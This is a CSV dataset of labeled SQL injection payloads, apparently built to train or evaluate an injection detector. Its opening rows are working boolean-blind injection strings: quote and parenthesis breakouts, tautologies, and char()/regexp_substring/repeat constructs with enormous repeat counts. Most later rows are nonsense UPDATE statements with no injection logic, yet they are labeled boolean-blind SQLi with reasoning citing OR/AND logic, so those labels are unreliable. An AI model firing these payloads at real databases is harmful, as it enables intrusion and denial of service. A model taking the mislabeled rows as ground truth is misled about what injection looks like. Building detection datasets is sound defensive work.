id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree,payload_norm,wrapper_detected,strip_depth,payload_delex_v2,signature,tier
25304,"1' ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",False,0,"__INT__' ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",e569f560,silver
25604,"-4558"" or ( 3965 = 3933 ) *3933 and ""hmdb"" like ""hmdb",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 53 chars.,1,"-4558"" or ( 3965 = 3933 ) *3933 and ""hmdb"" like ""hmdb",False,0,-4558__STR__hmdb__STR__hmdb,e58dce24,silver
21836,-5258 ) or ( 8459 = 8459 ) *4906,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 32 chars.,1,-5258 ) or ( 8459 = 8459 ) *4906,False,0,-__INT__ ) or ( __INT__ = __INT__ ) * __INT__,e5d2ce13,silver
25935,-5116 ) or ( 8287 = 4930 ) *4930,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 32 chars.,1,-5116 ) or ( 8287 = 4930 ) *4930,False,0,-__INT__ ) or ( __INT__ = __INT__ ) * __INT__,e5d2ce13,silver
2680,"1"" ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1"" ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",False,0,"__INT__"" ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",e691fb81,silver
19045,"1%"" or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1%"" or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",False,0,"__INT__ % "" or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",e6ef5263,silver
2567,"1"" ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""lmjg"" like ""lmjg",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1"" ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""lmjg"" like ""lmjg",False,0,"__INT__ ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",e74f49c2,silver
19678,"1"" ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""urqg"" = ""urqg",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1"" ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""urqg"" = ""urqg",False,0,"__INT__ ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",e74f49c2,silver
19986,"1' ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'nlky' like 'nlky",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'nlky' like 'nlky",False,0,"__INT__ ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",e74f49c2,silver
22539,"1' ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'zglq' = 'zglq",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'zglq' = 'zglq",False,0,"__INT__ ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",e74f49c2,silver
23874,"1' ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'akyc' = 'akyc",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1,"1' ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'akyc' = 'akyc",False,0,"__INT__ ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",e74f49c2,silver
23973,"1"" ) and 3732 = 3850 and ( ""edjv"" = ""edjv",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 41 chars.,2,"1"" ) and 3732 = 3850 and ( ""edjv"" = ""edjv",False,0,1__STR__edjv__STR__edjv,e75bab18,silver
34082,"UPDATE keep SET rice = 'pine', City = 'tower' WHERE birds = split",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 65 chars.,2,"UPDATE keep SET rice = 'pine', City = 'tower' WHERE birds = split",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
9773,"UPDATE second SET rocket = 'hearing', City = 'use' WHERE test = slept",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 69 chars.,2,"UPDATE second SET rocket = 'hearing', City = 'use' WHERE test = slept",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
4567,"UPDATE nice SET surprise = 'rope', City = 'beginning' WHERE later = image",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 73 chars.,2,"UPDATE nice SET surprise = 'rope', City = 'beginning' WHERE later = image",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
6242,"UPDATE vapor SET pile = 'return', City = 'land' WHERE solve = longer",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 68 chars.,2,"UPDATE vapor SET pile = 'return', City = 'land' WHERE solve = longer",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
9588,"UPDATE everywhere SET volume = 'moment', City = 'place' WHERE several = labor",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 77 chars.,2,"UPDATE everywhere SET volume = 'moment', City = 'place' WHERE several = labor",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
4291,"UPDATE plain SET basket = 'line', City = 'solution' WHERE organized = frozen",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 76 chars.,2,"UPDATE plain SET basket = 'line', City = 'solution' WHERE organized = frozen",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
4755,"UPDATE would SET zoo = 'family', City = 'death' WHERE magnet = throat",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 69 chars.,2,"UPDATE would SET zoo = 'family', City = 'death' WHERE magnet = throat",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
33983,"UPDATE slave SET ride = 'lips', City = 'give' WHERE pilot = cow",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 63 chars.,2,"UPDATE slave SET ride = 'lips', City = 'give' WHERE pilot = cow",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
3083,"UPDATE same SET proud = 'cookies', City = 'act' WHERE studied = breeze",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 70 chars.,2,"UPDATE same SET proud = 'cookies', City = 'act' WHERE studied = breeze",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
8194,"UPDATE broad SET moving = 'spin', City = 'mixture' WHERE corn = which",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 69 chars.,2,"UPDATE broad SET moving = 'spin', City = 'mixture' WHERE corn = which",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
3364,"UPDATE plant SET form = 'blanket', City = 'pound' WHERE hand = flat",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 67 chars.,2,"UPDATE plant SET form = 'blanket', City = 'pound' WHERE hand = flat",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
3456,"UPDATE through SET count = 'piano', City = 'plane' WHERE chief = simple",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 71 chars.,2,"UPDATE through SET count = 'piano', City = 'plane' WHERE chief = simple",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
6985,"UPDATE dinner SET correctly = 'smoke', City = 'closer' WHERE action = wash",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 74 chars.,2,"UPDATE dinner SET correctly = 'smoke', City = 'closer' WHERE action = wash",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
8474,"UPDATE worry SET seven = 'man', City = 'easily' WHERE hope = action",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 67 chars.,2,"UPDATE worry SET seven = 'man', City = 'easily' WHERE hope = action",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
5593,"UPDATE football SET offer = 'tomorrow', City = 'due' WHERE after = exchange",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 75 chars.,2,"UPDATE football SET offer = 'tomorrow', City = 'due' WHERE after = exchange",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
3831,"UPDATE hurried SET definition = 'lungs', City = 'statement' WHERE tea = problem",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 79 chars.,2,"UPDATE hurried SET definition = 'lungs', City = 'statement' WHERE tea = problem",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
3737,"UPDATE fun SET park = 'any', City = 'birth' WHERE twice = sudden",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 64 chars.,2,"UPDATE fun SET park = 'any', City = 'birth' WHERE twice = sudden",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
8940,"UPDATE farmer SET wire = 'thin', City = 'sense' WHERE system = decide",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 69 chars.,2,"UPDATE farmer SET wire = 'thin', City = 'sense' WHERE system = decide",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
34972,"UPDATE hot SET fat = 'wash', City = 'band' WHERE almost = root",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 62 chars.,2,"UPDATE hot SET fat = 'wash', City = 'band' WHERE almost = root",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
8287,"UPDATE effort SET noise = 'process', City = 'smaller' WHERE strong = sets",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 73 chars.,2,"UPDATE effort SET noise = 'process', City = 'smaller' WHERE strong = sets",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
7078,"UPDATE strange SET establish = 'nation', City = 'meant' WHERE anyone = weigh",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 76 chars.,2,"UPDATE strange SET establish = 'nation', City = 'meant' WHERE anyone = weigh",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
4848,"UPDATE dried SET swim = 'north', City = 'huge' WHERE flight = saved",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 67 chars.,2,"UPDATE dried SET swim = 'north', City = 'huge' WHERE flight = saved",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
34478,"UPDATE paper SET became = 'grabbed', City = 'anybody' WHERE possible = climate",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 78 chars.,2,"UPDATE paper SET became = 'grabbed', City = 'anybody' WHERE possible = climate",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
34280,"UPDATE direct SET classroom = 'nature', City = 'base' WHERE graph = mysterious",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 78 chars.,2,"UPDATE direct SET classroom = 'nature', City = 'base' WHERE graph = mysterious",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
35071,"UPDATE mental SET win = 'cake', City = 'afternoon' WHERE me = pull",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 66 chars.,2,"UPDATE mental SET win = 'cake', City = 'afternoon' WHERE me = pull",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
7171,"UPDATE wash SET clothing = 'guess', City = 'monkey' WHERE nuts = coming",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 71 chars.,2,"UPDATE wash SET clothing = 'guess', City = 'monkey' WHERE nuts = coming",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
2989,"UPDATE bare SET bigger = 'six', City = 'plus' WHERE common = wind",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 65 chars.,2,"UPDATE bare SET bigger = 'six', City = 'plus' WHERE common = wind",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
7449,"UPDATE sold SET merely = 'apple', City = 'sky' WHERE finest = quietly",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 69 chars.,2,"UPDATE sold SET merely = 'apple', City = 'sky' WHERE finest = quietly",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
4941,"UPDATE coach SET block = 'score', City = 'hardly' WHERE anywhere = completely",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 77 chars.,2,"UPDATE coach SET block = 'score', City = 'hardly' WHERE anywhere = completely",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
8660,"UPDATE pattern SET somehow = 'take', City = 'unhappy' WHERE avoid = grass",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 73 chars.,2,"UPDATE pattern SET somehow = 'take', City = 'unhappy' WHERE avoid = grass",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
6710,"UPDATE appearance SET forget = 'gasoline', City = 'properly' WHERE usual = enemy",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 80 chars.,2,"UPDATE appearance SET forget = 'gasoline', City = 'properly' WHERE usual = enemy",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
35170,"UPDATE which SET gas = 'court', City = 'its' WHERE dropped = can",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 64 chars.,2,"UPDATE which SET gas = 'court', City = 'its' WHERE dropped = can",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
6059,"UPDATE political SET bridge = 'eventually', City = 'youth' WHERE tone = cloth",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 77 chars.,2,"UPDATE political SET bridge = 'eventually', City = 'youth' WHERE tone = cloth",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
3270,"UPDATE laid SET fuel = 'birds', City = 'won' WHERE carbon = percent",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 67 chars.,2,"UPDATE laid SET fuel = 'birds', City = 'won' WHERE carbon = percent",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
34379,"UPDATE tomorrow SET plant = 'or', City = 'nearer' WHERE garden = pipe",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 69 chars.,2,"UPDATE tomorrow SET plant = 'or', City = 'nearer' WHERE garden = pipe",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
7822,"UPDATE hunter SET directly = 'from', City = 'rocky' WHERE any = general",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 71 chars.,2,"UPDATE hunter SET directly = 'from', City = 'rocky' WHERE any = general",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
9126,"UPDATE syllable SET regular = 'went', City = 'provide' WHERE deeply = swung",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 75 chars.,2,"UPDATE syllable SET regular = 'went', City = 'provide' WHERE deeply = swung",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
9956,"UPDATE zebra SET mighty = 'ground', City = 'worried' WHERE press = cent",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 71 chars.,2,"UPDATE zebra SET mighty = 'ground', City = 'worried' WHERE press = cent",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,silver
